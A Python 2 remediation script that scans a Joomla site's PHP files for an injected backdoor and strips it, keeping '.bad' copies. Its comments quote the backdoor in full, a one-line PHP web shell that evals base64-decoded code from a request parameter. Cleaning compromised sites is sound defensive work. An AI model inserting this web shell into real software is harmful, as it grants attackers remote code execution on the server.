import os
import sys
from shutil import copyfile

# Change root_dir to the path of the Joomla root
root_dir = ""

if len(root_dir) == 0:
	print "Please change root_dir variable to the Joomla site root. Exiting..."
	sys.exit()

if not os.path.exists(root_dir):
	print "Path nor found. Exiting..."
	sys.exit()

# Traverse the site and check all .PHP files for signature
for path, dirs, files in os.walk(root_dir):
	for filename in files:
		if filename.endswith('.php'):
			src = os.path.join(path, filename)
			dst = src + ".bad"
			
			new_content = ""
			replace_file = False
			with open( src, 'r' ) as f:
				content = f.read()
				
				#
				# The modified PHP files contained the following additional code. It would be either on 
				# 1 line or on 3.
				#
				# Insert code:
				# <?PHP defined('_OLD_JEXEC_') or die(@eval(base64_decode($_REQUEST['comment']))); ?>
				#
				#<?PHP
				# defined('_OLD_JEXEC_') or die(@eval(base64_decode($_REQUEST['comment'])));
				# ?><?php...
				#
				
				# Identify hmei7 code
				marker_pos = content.rfind("_OLD_JEXEC_")
				if marker_pos > 0:
					print "{0} contains marker at {1} ".format(src, marker_pos)
					end_php_pos = content.find("?>",marker_pos + 12)
					if end_php_pos > 0:
						# Strip new code from page
						new_content = content[end_php_pos+2:]
						replace_file = True
			
				f.close()
		
			if replace_file:
				# Copy original with new .bad extension
				copyfile(src, dst)
				# Save stripped content
				print "Writing {0}...".format(src)
				with open( src, 'w' ) as f:
					f.write(new_content)
					f.close()

